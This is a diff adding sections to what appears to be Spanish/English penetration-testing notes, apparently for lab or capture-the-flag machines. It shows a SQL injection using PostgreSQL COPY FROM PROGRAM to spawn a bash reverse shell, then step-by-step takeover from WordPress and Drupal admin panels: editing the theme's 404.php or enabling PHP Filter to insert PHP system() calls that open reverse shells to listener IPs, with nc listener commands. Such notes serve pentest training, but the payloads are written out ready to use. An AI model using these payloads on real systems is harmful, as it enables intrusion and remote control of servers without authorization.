@@ -182,4 +182,58 @@ stty rows <rownb> columns <colnb>
     '; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.10.10/443 0>&1'''; --
     ```
 
+## Wordpress {-}
 
+When we are connected to the wordpress admin panel, the trick is to modify Theme **404.php** file.
+
+We can go to `Appearance > Editor` and update 404 Template.
+
+> [ ! ] Note: if this file doesn't exist, **Select theme to edit** and search for another theme.
+
+listen on port 443
+
+```bash
+nc -nlvp 443
+```
+
+Edit 404.php file by inserting a reverse shell,
+
+```php
+<?php
+    system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'");
+?>
+```
+
+Go to url `http://10.10.10.10/?p=404.php` or `http://10.10.10.10/wp-content/themes/<theme-name>/404.php`
+
+
+## Druppal {-}
+
+Para ejecutar commandos o mejor dicho, para ganar accesso al systema desde un admin panel de drupal siempre es el mismo.
+
+1. En modules, habilitar el componente PHP Filter
+
+    ```{r, echo = FALSE, fig.cap="Drupal - habilitar PHP Filter", out.width="90%"}
+    knitr::include_graphics("images/drupal-phpfilter.png")
+    ```
+
+1. Crear un nuevo contenido
+
+    ```{r, echo = FALSE, fig.cap="Drupal - Nuevo articulo", out.width="90%"}
+    knitr::include_graphics("images/drupal-new-article.png")
+    ```
+
+1. Ponernos en escucha en el puerto 443
+
+    ```bash
+    nc -nlvp 443
+    ```
+
+1. En drupal añadir en el body
+
+    ```php
+    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
+    ```
+
+1. En Text Format le ponemos a **PHP code**
+1. Le damos al boton Preview
